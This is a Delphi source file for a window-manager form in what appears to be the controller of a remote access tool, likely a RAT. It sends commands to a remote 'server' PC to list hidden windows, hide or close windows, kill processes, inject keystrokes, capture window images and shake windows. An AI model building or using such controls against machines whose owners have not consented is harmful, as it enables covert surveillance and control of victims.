unit UnitWindows;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, ComCtrls, Menus, UnitMain, sSkinProvider, UnitConexao;

type
  TFormWindows = class(TForm)
    StatusBar1: TStatusBar;
    AdvListView1: TListView;
    PopupMenu1: TPopupMenu;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Incluirjanelasocultas1: TMenuItem;
    N2: TMenuItem;
    Fechar1: TMenuItem;
    Desabilitar1: TMenuItem;
    Habilitar1: TMenuItem;
    Ocultar1: TMenuItem;
    Mostrar1: TMenuItem;
    Minimizar1: TMenuItem;
    Maximizar1: TMenuItem;
    Restaurar1: TMenuItem;
    N3: TMenuItem;
    Mudarttulodajanela1: TMenuItem;
    N4: TMenuItem;
    Finalizarprocesso1: TMenuItem;
    remerjanela1: TMenuItem;
    sSkinProvider1: TsSkinProvider;
    Enviarteclas1: TMenuItem;
    N5: TMenuItem;
    Obterimagem1: TMenuItem;
    procedure AdvListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure remerjanela1Click(Sender: TObject);
    procedure Incluirjanelasocultas1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure AdvListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure AdvListView1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Fechar1Click(Sender: TObject);
    procedure Desabilitar1Click(Sender: TObject);
    procedure Habilitar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Restaurar1Click(Sender: TObject);
    procedure Finalizarprocesso1Click(Sender: TObject);
    procedure Mudarttulodajanela1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure Enviarteclas1Click(Sender: TObject);
    procedure Obterimagem1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormWindows: TFormWindows;

implementation

{$R *.dfm}

uses
  DateUtils,
  ShellApi,
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures,
  UnitSendKeys,
  CustomIniFiles,
  UnitWinPrev,
  JPEG;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormWindows.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormWindows.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormWindows.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Index = 0) or
     (LastSortedColumn.Index = 5) then
  begin
    if LastSortedColumn.Index = 0 then
    begin
       n1 := StrToIntDef(Item1.caption, 0);
       n2 := StrToIntDef(Item2.caption, 0);
    end;

     if LastSortedColumn.Index = 5 then
     begin
       n1 := StrToIntDef(Item1.SubItems[4], 0);
       n2 := StrToIntDef(Item2.SubItems[4], 0);
     end;
    if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;
  end else
  begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormWindows.AdvListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to AdvListview1.Columns.Count -1 do AdvListview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormWindows.AtualizarIdioma;
begin
  AdvListView1.Column[0].Caption := traduzidos[209];
  AdvListView1.Column[1].Caption := traduzidos[210];
  AdvListView1.Column[2].Caption := traduzidos[211];
  AdvListView1.Column[3].Caption := traduzidos[212];
  AdvListView1.Column[4].Caption := traduzidos[213];
  AdvListView1.Column[5].Caption := traduzidos[214];
  Atualizar1.Caption := traduzidos[192];

  Incluirjanelasocultas1.Caption := traduzidos[215];
  Fechar1.Caption := traduzidos[216];
  Desabilitar1.Caption := traduzidos[217];
  Habilitar1.Caption := traduzidos[218];
  Ocultar1.Caption := traduzidos[219];
  Mostrar1.Caption := traduzidos[220];
  Minimizar1.Caption := traduzidos[221];
  Maximizar1.Caption := traduzidos[222];
  Restaurar1.Caption := traduzidos[223];
  Mudarttulodajanela1.Caption := traduzidos[224];
  Finalizarprocesso1.Caption := traduzidos[225];
  remerjanela1.Caption := traduzidos[226];
  Enviarteclas1.Caption := traduzidos[607];
  Obterimagem1.Caption := traduzidos[613];
end;

constructor TFormWindows.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('WindowManager', 'Width', Width);
    Height := IniFile.ReadInteger('WindowManager', 'Height', Height);
    Left := IniFile.ReadInteger('WindowManager', 'Left', Left);
    Top := IniFile.ReadInteger('WindowManager', 'Top', Top);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('WindowManager', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('WindowManager', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('WindowManager', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView1.Column[3].Width := IniFile.ReadInteger('WindowManager', 'LV1_3', AdvListView1.Column[3].Width);
    AdvListView1.Column[4].Width := IniFile.ReadInteger('WindowManager', 'LV1_4', AdvListView1.Column[4].Width);
    AdvListView1.Column[5].Width := IniFile.ReadInteger('WindowManager', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;



procedure TFormWindows.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('WindowManager', 'Width', Width);
    IniFile.WriteInteger('WindowManager', 'Height', Height);
    IniFile.WriteInteger('WindowManager', 'Left', Left);
    IniFile.WriteInteger('WindowManager', 'Top', Top);
    IniFile.WriteInteger('WindowManager', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('WindowManager', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('WindowManager', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('WindowManager', 'LV1_3', AdvListView1.Column[3].Width);
    IniFile.WriteInteger('WindowManager', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.WriteInteger('WindowManager', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormWindows.FormCreate(Sender: TObject);
begin
  AdvListView1.SmallImages := FormMain.SuperImageList;
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

procedure TFormWindows.FormShow(Sender: TObject);
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  AtualizarIdioma;
  Atualizar1Click(Atualizar1);
end;

procedure TFormWindows.Fechar1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[247] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(FECHARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Restaurar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(RESTAURARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Finalizarprocesso1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[206] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(FINALIZARJANELA + '|' + AdvListView1.Items.Item[i].SubItems.Strings[4] + '|');
  end;
end;

procedure TFormWindows.Desabilitar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(DESABILITARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Enviarteclas1Click(Sender: TObject);
var
  i: integer;
begin
  Application.CreateForm(TFormSendKeys, FormSendKeys);
  try
    if FormSendKeys.ShowModal = mrOK then
    begin
      if FormSendkeys.Edit1.Text <> '' then
      for i := AdvListView1.Items.Count - 1 downto 0 do
      begin
        if AdvListView1.Items.Item[i].Selected = True then
        Servidor.EnviarString(SENDKEYSWINDOW + '|' + AdvListView1.Items.Item[i].Caption + '|' + FormSendkeys.Edit1.Text);
      end;
    end;
    finally
    FormSendKeys.Release;
    FormSendKeys := nil;
  end;
end;

procedure TFormWindows.Habilitar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(HABILITARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Incluirjanelasocultas1Click(Sender: TObject);
var
  ShowHidden: boolean;
begin
  Incluirjanelasocultas1.Checked := not Incluirjanelasocultas1.Checked;
  ShowHidden := Incluirjanelasocultas1.Checked;
  if ShowHidden = true then Servidor.EnviarString(LISTADEJANELAS + '|' + 'T' + '|') else
  Servidor.EnviarString(LISTADEJANELAS + '|' + 'F' + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormWindows.Obterimagem1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(WINDOWPREV + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Ocultar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(OCULTARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Mostrar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(MOSTRARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Mudarttulodajanela1Click(Sender: TObject);
var
  TempStr: string;
begin
  TempStr := AdvListView1.Selected.SubItems.Strings[0];
  if InputQuery(traduzidos[224], traduzidos[248] + ':', TempStr) then
  Servidor.EnviarString(MUDARCAPTION + '|' + AdvListView1.Selected.Caption + '|' + TempStr);
end;

procedure TFormWindows.Minimizar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(MINIMIZARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.Maximizar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(MAXIMIZARJANELA + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

function SplitAtributos(Str: string; var Visible: boolean): String;
var
  TempStr: string;
begin
  TempStr := Str;
  result := '';
  Visible := false;
  if Length(TempStr) <= 0 then exit;

  if TempStr[1] = 'E' then Result := traduzidos[618] else
  if TempStr[1] = 'D' then Result := traduzidos[619] else exit;

  delete(TempStr, 1, 4);
  if TempStr[1] = 'V' then Result := Result + ' - ' + traduzidos[614] else
  if TempStr[1] = 'H' then Result := Result + ' - ' + traduzidos[615];
  if TempStr[1] = 'V' then Visible := true;

  delete(TempStr, 1, 4);
  if TempStr = 'Max' then Result := Result + ' - ' + traduzidos[616] else
  if TempStr = 'Min' then Result := Result + ' - ' + traduzidos[617];
end;

function GetImageIndex(FileName: string): integer;
var
  SHFileInfo: TSHFileInfo;
begin
  result := - 1;
  try
    SHGetFileInfo(PChar(FileName), FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);
    Result := SHFileInfo.iIcon;
    finally
    if Result <= 0 then result := - 1;
  end;
end;

procedure TFormWindows.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: integer;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
  TempBool: boolean;
  WinPrev: TFormWinPrev;
  Stream: TMemoryStream;
  JPG: TJpegImage;
  Bitmap: TBitmap;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEJANELAS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdvListView1.Items.BeginUpdate;
    try
    if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
    while (recebido <> '') and (Visible = True) do
    begin
        TempStr := Copy(Recebido, 1, posex(#13#10, Recebido) - 1);
        delete(Recebido, 1, posex(#13#10, Recebido) + 1);

        Item := AdvListView1.Items.Add;

        Result := SplitString(TempStr, DelimitadorComandos);
        Result[3] := SplitAtributos(Result[3], TempBool);
        Item.Caption := Result[0];
        if TempBool = false then
        begin
          Item.Data := TObject(ClGray);
          Item.Cut := true;
        end;
        Item.SubItems.Add(Result[1]);
        Item.SubItems.Add(Result[2]);
        Item.SubItems.Add(Result[3]);
        Item.SubItems.Add(Result[4]);
        Item.SubItems.Add(Result[5]);

        if FileExists(Item.SubItems.Strings[3]) = true then
        Item.ImageIndex := GetImageIndex(Item.SubItems.Strings[3]) else Item.ImageIndex := GetImageIndex('*' + ExtractFileExt(Item.SubItems.Strings[3]));

      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;
    AdvListView1.Refresh;
    StatusBar1.Panels.Items[0].Text := traduzidos[227];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FECHARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[229] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[230];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = HABILITARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[231] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[232];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = DESABILITARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[233] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[234];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = OCULTARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[235] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[236];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MOSTRARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[237] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[238];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MINIMIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[239] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[240];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MAXIMIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[241] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[242];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = RESTAURARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[243] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[244];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FINALIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[199] else
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[200];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MUDARCAPTION then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[245] else
    StatusBar1.Panels.Items[0].Text := traduzidos[228] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[246];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = WINDOWPREV then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));

    //Application.CreateForm(TFormWinPrev, WinPrev);
    WinPrev := TFormWinPrev.Create(nil);
    WinPrev.Caption := {Traduzidos[228] + ': ' + }TempStr;

    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(Recebido[1], length(Recebido) * 2);
    Stream.Position := 0;
    JPG := TJpegImage.Create;
    try
      JPG.LoadFromStream(Stream);
      except
      JPG.Free;
      Stream.Free;
      exit;
    end;
    Stream.Free;

    Bitmap := TBitmap.Create;
    Bitmap.Width := JPG.Width;
    Bitmap.Height := JPG.Height;
    Bitmap.Canvas.Draw(0, 0, JPG);
    JPG.Free;

    WinPrev.ClientWidth := Bitmap.Width;
    WinPrev.ClientHeight := Bitmap.Height;

    WinPrev.Image1.Picture := nil;
    WinPrev.Image1.Picture.Bitmap.Assign(Bitmap);
    Bitmap.Free;

    try
      WinPrev.ShowModal;
      finally
      WinPrev.Release;
      WinPrev := nil;
    end;

  end else



end;

procedure TFormWindows.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := false;
  if AdvListView1.Selected = nil then
  begin
    Atualizar1.Enabled := true;
    Incluirjanelasocultas1.Enabled := true;
  end else
  begin
    for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := true;
    if AdvListView1.SelCount > 1 then Mudarttulodajanela1.Enabled := False;
  end;
end;

procedure TFormWindows.remerjanela1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if AdvListView1.Items.Item[i].Selected = True then
    Servidor.EnviarString(CRAZYWINDOW + '|' + AdvListView1.Items.Item[i].Caption + '|');
  end;
end;

procedure TFormWindows.AdvListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormWindows.AdvListView1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_DELETE then Finalizarprocesso1Click(Finalizarprocesso1);
end;

procedure TFormWindows.Atualizar1Click(Sender: TObject);
var
  ShowHidden: boolean;
begin
  ShowHidden := Incluirjanelasocultas1.Checked;
  if ShowHidden = true then Servidor.EnviarString(LISTADEJANELAS + '|' + 'T' + '|') else
  Servidor.EnviarString(LISTADEJANELAS + '|' + 'F' + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

end.
